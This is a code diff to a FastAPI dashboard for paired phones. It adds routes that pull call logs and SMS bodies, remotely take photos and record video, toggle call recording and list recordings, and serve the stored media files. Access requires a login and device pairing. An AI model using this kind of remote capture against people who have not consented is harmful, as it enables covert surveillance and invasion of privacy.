@@ -4,7 +4,7 @@ import time
 import json
 from pathlib import Path
 from fastapi import FastAPI, Request, HTTPException, Response, Depends
-from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
+from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, FileResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 from pydantic import BaseModel
@@ -12,7 +12,9 @@ from pydantic import BaseModel
 from . import config, auth
 from .auth import require_login
 from .device_client import (
-    health, pair, device_info, location_current, camera_list, camera_capture
+    health, pair, device_info, location_current, camera_list, camera_capture,
+    camera_capture_file, call_logs, sms, callrecorder_status,
+    callrecorder_toggle, call_recordings, video_record, video_list, video_file,
 )
 from .device_manager import registry
 
@@ -240,6 +242,191 @@ async def device_camera_capture(host: str, port: int, camera_id: str,
                              cert_fp=dev.cert_fp or None)
     return info
 
+# ---------- v2.0.0 feature routes: call logs, SMS, video, call recorder, media pull ----------
+
+@app.get("/api/device/{host}/{port}/logs/calls")
+async def device_call_logs(host: str, port: int, limit: int = 100,
+                           _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = call_logs(dev.host, dev.token or "", min(max(limit, 1), 1000),
+                        dev.port, cert_fp=dev.cert_fp or None)
+    return info
+
+@app.get("/api/device/{host}/{port}/sms")
+async def device_sms(host: str, port: int, box: str = "inbox", limit: int = 100,
+                     include_body: int = 0, _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = sms(dev.host, dev.token or "", box, min(max(limit, 1), 1000),
+                  include_body=bool(include_body), port=dev.port,
+                  cert_fp=dev.cert_fp or None)
+    return info
+
+@app.post("/api/device/{host}/{port}/camera/capture/pull")
+async def device_camera_capture_pull(host: str, port: int, camera_id: str = "back",
+                                     _=Depends(require_login)):
+    """Capture a photo on the phone, download the JPEG, store it locally and
+    register a media row — so the photo lands in the dashboard catalogue."""
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = camera_capture(dev.host, dev.token or "", camera_id, dev.port,
+                             cert_fp=dev.cert_fp or None)
+    if not isinstance(info, dict) or info.get("status") != "ok":
+        return {"ok": False, "error": "capture_failed", "detail": info}
+    capture = info.get("capture") or {}
+    capture_id = capture.get("id")
+    if not capture_id:
+        return {"ok": False, "error": "no_capture_id", "detail": info}
+
+    status, data, _pin = camera_capture_file(
+        dev.host, dev.token or "", capture_id, dev.port, cert_fp=dev.cert_fp or None)
+    if status != 200 or not data:
+        return {"ok": False, "error": "download_failed", "status": status}
+
+    dev_dir = config.captures_dir / key.replace(":", "_")
+    dev_dir.mkdir(parents=True, exist_ok=True)
+    fname = f"photo_{capture_id}.jpg"
+    local_path = dev_dir / fname
+    local_path.write_bytes(data)
+
+    entry = registry.add_media(
+        key, "photo",
+        path=str(local_path),
+        size_bytes=len(data),
+        duration_sec=0,
+        note=f"captured via camera {capture.get('cameraId', camera_id)}"
+    )
+    return {"ok": True, "media": entry, "stored": str(local_path)}
+
+@app.post("/api/device/{host}/{port}/video/record")
+async def device_video_record(host: str, port: int, camera_id: str = "back",
+                              duration_ms: int = 15000, _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = video_record(dev.host, dev.token or "", camera_id,
+                           min(max(duration_ms, 2000), 120_000),
+                           dev.port, cert_fp=dev.cert_fp or None)
+    if isinstance(info, dict) and info.get("id"):
+        dev_dir = config.captures_dir / key.replace(":", "_")
+        dev_dir.mkdir(parents=True, exist_ok=True)
+        try:
+            status, data, _pin = video_file(
+                dev.host, dev.token or "", info["id"], dev.port,
+                cert_fp=dev.cert_fp or None)
+            if status == 200 and data:
+                local_path = dev_dir / f"video_{info['id']}.mp4"
+                local_path.write_bytes(data)
+                entry = registry.add_media(
+                    key, "video", path=str(local_path),
+                    size_bytes=len(data),
+                    duration_sec=round((info.get("durationMs") or 0) / 1000),
+                    note=f"video via camera {camera_id}"
+                )
+                return {"ok": True, "video": info, "media": entry}
+        except Exception as e:
+            return {"ok": True, "video": info, "warning": f"pull failed: {e}"}
+    return info
+
+@app.get("/api/device/{host}/{port}/video/list")
+async def device_video_list(host: str, port: int, _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = video_list(dev.host, dev.token or "", dev.port,
+                         cert_fp=dev.cert_fp or None)
+    return info
+
+@app.post("/api/device/{host}/{port}/callrecorder/toggle")
+async def device_callrecorder_toggle(host: str, port: int, enabled: int | None = None,
+                                     _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = callrecorder_toggle(dev.host, dev.token or "",
+                                  None if enabled is None else bool(enabled),
+                                  dev.port, cert_fp=dev.cert_fp or None)
+    return info
+
+@app.get("/api/device/{host}/{port}/callrecorder/status")
+async def device_callrecorder_status(host: str, port: int, _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = callrecorder_status(dev.host, dev.token or "", dev.port,
+                                  cert_fp=dev.cert_fp or None)
+    return info
+
+@app.get("/api/device/{host}/{port}/callrecordings")
+async def device_call_recordings(host: str, port: int, _=Depends(require_login)):
+    key = f"{host}:{port}"
+    dev, err = _paired_device_or_error(key)
+    if err:
+        return err
+    if dev is None:
+        return {"error": "not_found", "message": "Device not found"}
+    info, _ = call_recordings(dev.host, dev.token or "", dev.port,
+                              cert_fp=dev.cert_fp or None)
+    return info
+
+@app.get("/api/device/{host}/{port}/media/files/{media_id}")
+async def device_media_file(host: str, port: int, media_id: int,
+                            _=Depends(require_login)):
+    """Serve a stored capture file (downloaded from the phone earlier) with
+    download-link semantics. The file lives under the local captures dir;
+    the DB row is the source of truth for its path."""
+    key = f"{host}:{port}"
+    if not registry.get_device(key):
+        raise HTTPException(404, "Device not found")
+    entry = registry.get_media(media_id)
+    if not entry or entry.get("device_key") != key:
+        raise HTTPException(404, "Media not found")
+    raw_path = entry.get("path") or ""
+    # Encrypted at rest ("enc:" prefix) — decrypt for serving.
+    path = config.decrypt_text(raw_path) if raw_path.startswith("enc:") else raw_path
+    local = Path(path)
+    captures_root = config.captures_dir.resolve()
+    try:
+        local.resolve().relative_to(captures_root)
+    except ValueError:
+        raise HTTPException(403, "Path outside captures directory")
+    if not local.is_file():
+        raise HTTPException(404, "File missing on disk")
+    media_type = {
+        "photo": "image/jpeg",
+        "video": "video/mp4",
+        "call_recording": "audio/mp4",
+        "mic_recording": "audio/wav",
+        "screenshot": "image/png",
+        "screen_recording": "video/mp4",
+    }.get(entry.get("kind"), "application/octet-stream")
+    return FileResponse(local, media_type=media_type, filename=local.name)
+
 # ---------- Media Catalogue & Nicknames (SQLite-backed, no phone needed) ----------
 
 @app.get("/api/device/{host}/{port}/media")
@@ -250,7 +437,11 @@ async def device_media_list(host: str, port: int, _=Depends(require_login)):
     key = f"{host}:{port}"
     if not registry.get_device(key):
         raise HTTPException(404, "Device not found")
-    return {"ok": True, "media": registry.list_media(key)}
+    media = registry.list_media(key)
+    # Enrich with a download link so the UI can fetch stored files.
+    for m in media:
+        m["download_url"] = f"/api/device/{host}/{port}/media/files/{m.get('id')}"
+    return {"ok": True, "media": media}
 
 @app.post("/api/device/{host}/{port}/media")
 async def device_media_add(host: str, port: int, req: MediaRequest,
